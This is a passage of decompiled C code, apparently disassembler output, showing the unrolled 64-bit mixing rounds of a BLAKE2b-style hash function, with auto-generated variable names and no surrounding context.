    v590 = v21 + v607 + __PAIR64__(HIDWORD(v590), v17);
    v22 = (v602 ^ v590) >> 16;
    HIDWORD(v18) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | (((unsigned int)v602 ^ (unsigned int)v590) << 16);
    v24 = v22 + v602 - 205731576;
    v23 = (__PAIR64__(v19, v22) + v18) >> 32;
    v602 = __PAIR64__(HIDWORD(v18), v22);
    HIDWORD(v20) = v23 ^ HIDWORD(v21);
    LODWORD(v20) = v24 ^ v21;
    HIDWORD(v594) = v20 >> 31;
    LODWORD(v594) = (2 * (v24 ^ v21)) | ((v23 ^ HIDWORD(v21)) >> 31);
    v591 += v595 + v608;
    v1128 = v603 ^ v591;
    LODWORD(v603) = HIDWORD(v603) ^ HIDWORD(v591);
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) - 2067093701;
    HIDWORD(v21) = __CFADD__(HIDWORD(v603) ^ HIDWORD(v591), -2067093701) + v1128 - 1150833019;
    v1197 = HIDWORD(v18) ^ v595;
    v1199 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    LODWORD(v20) = HIDWORD(v18) ^ v595;
    HIDWORD(v20) = HIDWORD(v21) ^ HIDWORD(v595);
    HIDWORD(v595) = ((unsigned int)(HIDWORD(v21) ^ HIDWORD(v595)) >> 24) | v1199;
    v591 += __PAIR64__(HIDWORD(v595), v20 >> 24) + v609;
    v1182 = v603 ^ v591;
    v656 = ((unsigned int)v603 ^ (unsigned int)v591) << 16;
    v25 = __PAIR64__(v1128 ^ HIDWORD(v591), (unsigned int)v603 ^ (unsigned int)v591) >> 16;
    LODWORD(v21) = ((v1128 ^ HIDWORD(v591)) >> 16) | v656;
    v26 = v25 + HIDWORD(v18);
    v603 = __PAIR64__(v21, v25);
    HIDWORD(v599) = (__PAIR64__(v21, v25) + __PAIR64__(HIDWORD(v21), HIDWORD(v18))) >> 32;
    v27 = (v25 + HIDWORD(v18)) ^ (v20 >> 24);
    HIDWORD(v21) = HIDWORD(v599) ^ HIDWORD(v595);
    HIDWORD(v595) = __PAIR64__(HIDWORD(v599) ^ HIDWORD(v595), v27) >> 31;
    LODWORD(v595) = (2 * v27) | (HIDWORD(v21) >> 31);
    v28 = v596 + v610 + v592;
    v928 = v604 ^ v28;
    v658 = ((HIDWORD(v604) ^ HIDWORD(v28)) - 23791573) ^ v596;
    v1064 = v658 << 8;
    LODWORD(v21) = ((__PAIR64__((unsigned int)v604 ^ (unsigned int)v28, HIDWORD(v604) ^ HIDWORD(v28))
                   + 0x3C6EF372FE94F82Bi64) ^ v596) >> 24;
    v29 = ((((__PAIR64__((unsigned int)v604 ^ (unsigned int)v28, HIDWORD(v604) ^ HIDWORD(v28)) + 0x3C6EF372FE94F82Bi64) >> 32) ^ HIDWORD(v596)) >> 24) | v1064;
    v596 = __PAIR64__(v29, v21);
    v592 = __PAIR64__(v29, v21) + v611 + v28;
    v30 = HIDWORD(v604) ^ HIDWORD(v28) ^ v592;
    v660 = v30;
    v930 = v30 << 16;
    v31 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v28 ^ HIDWORD(v592), v30) >> 16;
    LODWORD(v604) = v31;
    v33 = v31 + (HIDWORD(v604) ^ HIDWORD(v28)) - 23791573;
    v32 = (__PAIR64__(((v928 ^ HIDWORD(v592)) >> 16) | (v30 << 16), v31)
         + __PAIR64__(v928, HIDWORD(v604) ^ HIDWORD(v28))
         + 0x3C6EF372FE94F82Bi64) >> 32;
    HIDWORD(v604) = ((v928 ^ HIDWORD(v592)) >> 16) | (v30 << 16);
    v34 = __PAIR64__(v32, v33) ^ v596;
    LODWORD(v596) = (2 * (v33 ^ v596)) | ((v32 ^ HIDWORD(v596)) >> 31);
    v662 = 0;
    HIDWORD(v596) = v34 >> 31;
    v593 += v597 + v612;
    v1132 = v605 ^ v593;
    LODWORD(v21) = v605 ^ v593;
    LODWORD(v605) = HIDWORD(v605) ^ HIDWORD(v593);
    HIDWORD(v605) = v21;
    LODWORD(v21) = ((__PAIR64__(v21, v605) + 1595750129) >> 32) - 1521486534;
    v664 = (v605 + 1595750129) ^ v597;
    v932 = v664 << 8;
    LODWORD(v34) = v664;
    HIDWORD(v34) = v21 ^ HIDWORD(v597);
    LODWORD(v597) = v34 >> 24;
    HIDWORD(v597) = (((unsigned int)v21 ^ HIDWORD(v597)) >> 24) | (v664 << 8);
    v593 += v597 + v613;
    v666 = v605 ^ v593;
    v1066 = ((unsigned int)v605 ^ (unsigned int)v593) << 16;
    v35 = (v605 ^ v593) >> 16;
    v36 = __PAIR64__(v21, v35)
        + __PAIR64__(((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | v1066, (int)v605 + 1595750129);
    HIDWORD(v605) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | v1066;
    v37 = v36 ^ v597;
    LODWORD(v597) = (2 * (v36 ^ v597)) | ((unsigned int)(HIDWORD(v36) ^ HIDWORD(v597)) >> 31);
    v668 = 0;
    HIDWORD(v597) = v37 >> 31;
    v590 += v595 + v614;
    v934 = v35 ^ v590;
    v39 = (HIDWORD(v605) ^ HIDWORD(v590)) + v33;
    v38 = (__PAIR64__(v35 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590)) + __PAIR64__(v32, v33)) >> 32;
    v605 = __PAIR64__(v35 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590));
    v670 = v39 ^ v595;
    v1166 = (v39 ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v38, v39) ^ v595) >> 24;
    v40 = ((v38 ^ HIDWORD(v595)) >> 24) | v1166;
    v595 = __PAIR64__(v40, v21);
    v41 = v590;
    LODWORD(v590) = v21 + v615 + v590;
    v42 = __PAIR64__(v40, v21) + v615 + __PAIR64__(HIDWORD(v590), v41);
    HIDWORD(v590) = HIDWORD(v42);
    v936 = ((unsigned int)v605 ^ (unsigned int)v42) << 16;
    v672 = v605 ^ v42;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v42)) >> 16) | v936;
    v44 = ((v605 ^ v42) >> 16) + v39;
    v43 = (__PAIR64__(v21, (v605 ^ v42) >> 16) + __PAIR64__(v38, v39)) >> 32;
    v605 = __PAIR64__(v21, (v605 ^ v42) >> 16);
    HIDWORD(v600) = v43;
    v45 = __PAIR64__(v43, v44) ^ v595;
    LODWORD(v595) = (2 * (v44 ^ v595)) | ((v43 ^ HIDWORD(v595)) >> 31);
    v674 = 0;
    HIDWORD(v595) = v45 >> 31;
    v591 += v596 + v616;
    v1068 = v602 ^ v591;
    v46 = HIDWORD(v602) ^ HIDWORD(v591);
    v47 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v36;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v46 + v36) ^ v596;
    v938 = (_DWORD)v21 << 8;
    v676 = v21;
    LODWORD(v596) = __PAIR64__(HIDWORD(v47) ^ HIDWORD(v596), v21) >> 24;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v47) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8);
    v591 += v596 + v617;
    v48 = v46 ^ v591;
    v678 = v48;
    v1134 = v48 << 16;
    v49 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v48) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v48 << 16);
    v602 = __PAIR64__(v21, v49);
    v601 = __PAIR64__(v21, v49) + v47;
    v50 = (__PAIR64__(v21, v49) + v47) ^ v596;
    LODWORD(v596) = (2 * ((v49 + v47) ^ v596)) | ((((__PAIR64__(v21, v49) + v47) >> 32) ^ HIDWORD(v596)) >> 31);
    v680 = 0;
    HIDWORD(v596) = v50 >> 31;
    v592 += v597 + v618;
    v51 = HIDWORD(v603) ^ HIDWORD(v592);
    v940 = v603 ^ v592;
    v53 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v23, v24);
    v52 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v23, v24)) >> 32;
    HIDWORD(v603) = v603 ^ v592;
    v682 = v53 ^ v597;
    v1070 = ((unsigned int)v53 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v52, v53) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v52 ^ HIDWORD(v597)) >> 24) | v1070;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v619;
    v54 = v51 ^ v592;
    v684 = v54;
    v942 = v54 << 16;
    v55 = __PAIR64__(HIDWORD(v603) ^ HIDWORD(v592), v54) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | (v54 << 16);
    v57 = __PAIR64__(v21, v55) + __PAIR64__(v52, v53);
    v56 = (__PAIR64__(v21, v55) + __PAIR64__(v52, v53)) >> 32;
    v603 = __PAIR64__(v21, v55);
    v597 = (2 * (__PAIR64__(v56, v57) ^ v597)) | ((v56 ^ HIDWORD(v597)) >> 31);
    v686 = 0;
    v593 += v594 + v620;
    v58 = HIDWORD(v604) ^ HIDWORD(v593);
    v1198 = v604 ^ v593;
    v59 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
         + __PAIR64__(HIDWORD(v599), v26)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v26;
    HIDWORD(v604) = v604 ^ v593;
    v688 = HIDWORD(v18) ^ v594;
    v944 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v59, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v59 ^ HIDWORD(v594)) >> 24) | v944;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v621;
    v60 = v58 ^ v593;
    v690 = v60;
    v1072 = v60 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | (v60 << 16);
    v62 = (__PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v60) >> 16) + HIDWORD(v18);
    v61 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v60) >> 16) + __PAIR64__(v59, HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v60) >> 16);
    HIDWORD(v599) = v61;
    v63 = __PAIR64__(v61, v62) ^ v594;
    v692 = 0;
    LODWORD(v594) = (2 * (v62 ^ v594)) | ((v61 ^ HIDWORD(v594)) >> 31);
    v590 += __PAIR64__(v63 >> 31, v594) + v620;
    v64 = HIDWORD(v602) ^ HIDWORD(v590);
    v946 = v602 ^ v590;
    v66 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v56, v57);
    v65 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v56, v57)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    v694 = v66 ^ v594;
    LODWORD(v602) = v64;
    v67 = v65 ^ (v63 >> 31);
    v1136 = ((unsigned int)v66 ^ (unsigned int)v594) << 8;
    LODWORD(v63) = v66 ^ v594;
    HIDWORD(v63) = v67;
    v68 = HIBYTE(v67) | v1136;
    v590 += __PAIR64__(v68, v63 >> 24) + v616;
    v696 = v602 ^ v590;
    v948 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v69 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v948;
    v71 = __PAIR64__(v21, v69) + __PAIR64__(v65, v66);
    v70 = (__PAIR64__(v21, v69) + __PAIR64__(v65, v66)) >> 32;
    v602 = __PAIR64__(v21, v69);
    v72 = v71 ^ (v63 >> 24);
    HIDWORD(v63) = v70 ^ v68;
    LODWORD(v63) = v72;
    LODWORD(v594) = (2 * v72) | ((v70 ^ v68) >> 31);
    v698 = 0;
    HIDWORD(v594) = v63 >> 31;
    v591 += v595 + v610;
    v73 = HIDWORD(v603) ^ HIDWORD(v591);
    v1074 = v603 ^ v591;
    v74 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
         + __PAIR64__(HIDWORD(v599), v62)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v62;
    HIDWORD(v603) = v603 ^ v591;
    v700 = HIDWORD(v18) ^ v595;
    v950 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v74, HIDWORD(v18)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v74 ^ HIDWORD(v595)) >> 24) | v950;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v614;
    v75 = v73 ^ v591;
    v702 = v75;
    v1168 = v75 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | (v75 << 16);
    v77 = (__PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v75) >> 16) + HIDWORD(v18);
    v76 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v75) >> 16) + __PAIR64__(v74, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v75) >> 16);
    HIDWORD(v599) = v76;
    v78 = __PAIR64__(v76, v77) ^ v595;
    v704 = 0;
    LODWORD(v595) = (2 * (v77 ^ v595)) | ((v76 ^ HIDWORD(v595)) >> 31);
    HIDWORD(v595) = v78 >> 31;
    v592 += v596 + v615;
    v952 = v604 ^ v592;
    v79 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
         + __PAIR64__(HIDWORD(v600), v44)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v44;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    v706 = HIDWORD(v21) ^ v596;
    v1076 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(v79, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v79 ^ HIDWORD(v596)) >> 24) | v1076;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v621;
    v954 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    v708 = v604 ^ v592;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v954;
    v80 = (__PAIR64__(v21, (v604 ^ v592) >> 16) + __PAIR64__(v79, HIDWORD(v21))) >> 32;
    HIDWORD(v21) += (v604 ^ v592) >> 16;
    v604 = __PAIR64__(v21, (v604 ^ v592) >> 16);
    HIDWORD(v600) = v80;
    v710 = 0;
    v81 = __PAIR64__(v80, HIDWORD(v21)) ^ v596;
    LODWORD(v596) = (2 * (HIDWORD(v21) ^ v596)) | ((v80 ^ HIDWORD(v596)) >> 31);
    HIDWORD(v596) = v81 >> 31;
    v593 += v597 + v619;
    v1138 = v605 ^ v593;
    v82 = HIDWORD(v605) ^ HIDWORD(v593);
    v83 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v82 + v601) ^ v597;
    v956 = (_DWORD)v21 << 8;
    v712 = v21;
    LODWORD(v81) = v21;
    HIDWORD(v81) = HIDWORD(v83) ^ HIDWORD(v597);
    v84 = __PAIR64__(((unsigned int)(HIDWORD(v83) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8), v81 >> 24) + v612;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v83) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v84;
    v85 = v82 ^ v593;
    v1078 = v85 << 16;
    v714 = v85;
    LODWORD(v605) = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v85) >> 16;
    HIDWORD(v605) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v85 << 16);
    v601 = v605 + v83;
    v86 = (v605 + v83) ^ (v81 >> 24);
    HIDWORD(v81) = ((v605 + v83) >> 32) ^ HIDWORD(v597);
    LODWORD(v81) = v86;
    LODWORD(v597) = (2 * v86) | (HIDWORD(v81) >> 31);
    v716 = 0;
    HIDWORD(v597) = v81 >> 31;
    v590 += v595 + v607;
    v958 = v605 ^ v590;
    v87 = (__PAIR64__((unsigned int)v605 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590))
         + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    HIDWORD(v21) += HIDWORD(v605) ^ HIDWORD(v590);
    v605 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590));
    HIDWORD(v600) = v87;
    v1184 = (HIDWORD(v21) ^ (unsigned int)v595) << 8;
    v718 = HIDWORD(v21) ^ v595;
    LODWORD(v21) = (__PAIR64__(v87, HIDWORD(v21)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v87 ^ HIDWORD(v595)) >> 24) | v1184;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v618;
    v720 = v605 ^ v590;
    v960 = ((unsigned int)v605 ^ (unsigned int)v590) << 16;
    v88 = (v605 ^ v590) >> 16;
    v89 = v88;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | v960;
    v91 = v88 + HIDWORD(v21);
    v90 = (__PAIR64__(v21, v88) + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, v89);
    HIDWORD(v600) = v90;
    v92 = __PAIR64__(v90, v91) ^ v595;
    LODWORD(v595) = (2 * (v91 ^ v595)) | ((v90 ^ HIDWORD(v595)) >> 31);
    v722 = 0;
    HIDWORD(v595) = v92 >> 31;
    v591 += v596 + v606;
    v93 = HIDWORD(v602) ^ HIDWORD(v591);
    v1080 = v602 ^ v591;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v93 + v601) ^ v596;
    v601 += __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, v93);
    LODWORD(v602) = v93;
    v724 = v21;
    v962 = (_DWORD)v21 << 8;
    LODWORD(v21) = __PAIR64__(HIDWORD(v601) ^ HIDWORD(v596), v21) >> 24;
    LODWORD(v596) = v21;
    v94 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | v962, v21) + v608;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | v962;
    v591 += v94;
    v726 = v93 ^ v591;
    v1140 = (v93 ^ (unsigned int)v591) << 16;
    HIDWORD(v92) = HIDWORD(v602) ^ HIDWORD(v591);
    v95 = (v602 ^ v591) >> 16;
    HIDWORD(v602) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | v1140;
    LODWORD(v602) = v95;
    v601 += __PAIR64__(HIWORD(HIDWORD(v92)) | v1140, v95);
    v96 = v601 ^ v596;
    LODWORD(v596) = (2 * (v601 ^ v21)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 31);
    v728 = 0;
    HIDWORD(v596) = v96 >> 31;
    v592 += v597 + v617;
    v97 = HIDWORD(v603) ^ HIDWORD(v592);
    v964 = v603 ^ v592;
    v99 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v70, v71);
    v98 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v70, v71)) >> 32;
    HIDWORD(v603) = v603 ^ v592;
    LODWORD(v603) = v97;
    v730 = v99 ^ v597;
    v1082 = ((unsigned int)v99 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v98, v99) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v98 ^ HIDWORD(v597)) >> 24) | v1082;
    v100 = v21 + v613 + v592;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v597), v21) + v613 + v592) >> 32;
    v592 = __PAIR64__(v21, v100);
    v732 = v97 ^ v100;
    v966 = (v97 ^ v100) << 16;
    v101 = v603 ^ __PAIR64__(v21, v100);
    LODWORD(v21) = ((unsigned int)((v603 ^ __PAIR64__(v21, v100)) >> 32) >> 16) | v966;
    v103 = __PAIR64__(v21, v101 >> 16) + __PAIR64__(v98, v99);
    v102 = (__PAIR64__(v21, v101 >> 16) + __PAIR64__(v98, v99)) >> 32;
    HIDWORD(v603) = v21;
    LODWORD(v603) = v101 >> 16;
    v597 = (2 * (__PAIR64__(v102, v103) ^ v597)) | ((v102 ^ HIDWORD(v597)) >> 31);
    v734 = 0;
    v593 += v594 + v611;
    v1170 = v604 ^ v593;
    v104 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v77)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v77;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    v736 = HIDWORD(v18) ^ v594;
    v968 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v594) = (__PAIR64__(v104, HIDWORD(v18)) ^ v594) >> 24;
    HIDWORD(v594) = ((v104 ^ HIDWORD(v594)) >> 24) | v968;
    v593 += v594 + v609;
    v738 = v604 ^ v593;
    v1084 = ((unsigned int)v604 ^ (unsigned int)v593) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1084;
    v106 = ((v604 ^ v593) >> 16) + HIDWORD(v18);
    v105 = (__PAIR64__(v21, (v604 ^ v593) >> 16) + __PAIR64__(v104, HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v593) >> 16);
    HIDWORD(v599) = v105;
    v107 = __PAIR64__(v105, v106) ^ v594;
    LODWORD(v594) = (2 * (v106 ^ v594)) | ((v105 ^ HIDWORD(v594)) >> 31);
    v740 = 0;
    v590 += __PAIR64__(v107 >> 31, v594) + v617;
    v108 = HIDWORD(v602) ^ HIDWORD(v590);
    v970 = v602 ^ v590;
    v110 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v102, v103);
    v109 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v102, v103)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    LODWORD(v602) = v108;
    v742 = v110 ^ v594;
    v111 = v109 ^ (v107 >> 31);
    v1142 = ((unsigned int)v110 ^ (unsigned int)v594) << 8;
    LODWORD(v107) = v110 ^ v594;
    HIDWORD(v107) = v111;
    v112 = HIBYTE(v111) | v1142;
    v590 += __PAIR64__(v112, v107 >> 24) + v614;
    v744 = v602 ^ v590;
    v972 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v113 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v972;
    v115 = __PAIR64__(v21, v113) + __PAIR64__(v109, v110);
    v114 = (__PAIR64__(v21, v113) + __PAIR64__(v109, v110)) >> 32;
    v602 = __PAIR64__(v21, v113);
    v116 = v115 ^ (v107 >> 24);
    HIDWORD(v107) = v114 ^ v112;
    LODWORD(v107) = v116;
    LODWORD(v594) = (2 * v116) | ((v114 ^ v112) >> 31);
    v746 = 0;
    HIDWORD(v594) = v107 >> 31;
    v591 += v595 + v618;
    v117 = HIDWORD(v603) ^ HIDWORD(v591);
    v1086 = v603 ^ v591;
    v118 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
          + __PAIR64__(HIDWORD(v599), v106)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v106;
    HIDWORD(v603) = v603 ^ v591;
    v748 = HIDWORD(v18) ^ v595;
    v974 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v118, HIDWORD(v18)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v118 ^ HIDWORD(v595)) >> 24) | v974;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v606;
    v119 = v117 ^ v591;
    v750 = v119;
    v1192 = v119 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | (v119 << 16);
    v121 = (__PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v119) >> 16) + HIDWORD(v18);
    v120 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v119) >> 16) + __PAIR64__(v118, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v119) >> 16);
    HIDWORD(v599) = v120;
    v122 = __PAIR64__(v120, v121) ^ v595;
    LODWORD(v595) = (2 * (v121 ^ v595)) | ((v120 ^ HIDWORD(v595)) >> 31);
    v752 = 0;
    HIDWORD(v595) = v122 >> 31;
    v592 += v596 + v611;
    v123 = HIDWORD(v604) ^ HIDWORD(v592);
    v976 = v604 ^ v592;
    HIDWORD(v604) = v604 ^ v592;
    v124 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, v123) + __PAIR64__(HIDWORD(v600), v91)) >> 32;
    HIDWORD(v21) = v123 + v91;
    v754 = (v123 + v91) ^ v596;
    v1088 = v754 << 8;
    LODWORD(v21) = ((__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, v123) + __PAIR64__(HIDWORD(v600), v91)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v124 ^ HIDWORD(v596)) >> 24) | v1088;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v608;
    v125 = v123 ^ v592;
    v978 = v125 << 16;
    v756 = v125;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | (v125 << 16);
    v127 = (__PAIR64__(HIDWORD(v604) ^ HIDWORD(v592), v125) >> 16) + HIDWORD(v21);
    v126 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v592), v125) >> 16) + __PAIR64__(v124, HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v592), v125) >> 16);
    HIDWORD(v600) = v126;
    v128 = __PAIR64__(v126, v127) ^ v596;
    LODWORD(v596) = (2 * (v127 ^ v596)) | ((v126 ^ HIDWORD(v596)) >> 31);
    v758 = 0;
    HIDWORD(v596) = v128 >> 31;
    v593 += v597 + v621;
    v1144 = v605 ^ v593;
    v129 = HIDWORD(v605) ^ HIDWORD(v593);
    v130 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v129 + v601) ^ v597;
    v760 = v21;
    v980 = (_DWORD)v21 << 8;
    LODWORD(v128) = v21;
    HIDWORD(v128) = HIDWORD(v130) ^ HIDWORD(v597);
    LODWORD(v597) = v128 >> 24;
    v131 = __PAIR64__(((unsigned int)(HIDWORD(v130) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8), v597) + v619;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v130) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v131;
    v132 = v129 ^ v593;
    v1090 = v132 << 16;
    v762 = v132;
    v133 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v132) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v132 << 16);
    v605 = __PAIR64__(v21, v133);
    v601 = __PAIR64__(v21, v133) + v130;
    v134 = (__PAIR64__(v21, v133) + v130) ^ v597;
    v764 = 0;
    LODWORD(v597) = (2 * ((v133 + v130) ^ v597)) | ((((__PAIR64__(v21, v133) + v130) >> 32) ^ HIDWORD(v597)) >> 31);
    HIDWORD(v597) = v134 >> 31;
    v590 += v595 + v616;
    v982 = v133 ^ v590;
    v135 = (__PAIR64__(v133 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590)) + __PAIR64__(HIDWORD(v600), v127)) >> 32;
    HIDWORD(v21) = (HIDWORD(v605) ^ HIDWORD(v590)) + v127;
    HIDWORD(v600) = v135;
    v605 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590));
    v766 = HIDWORD(v21) ^ v595;
    v1172 = (HIDWORD(v21) ^ (unsigned int)v595) << 8;
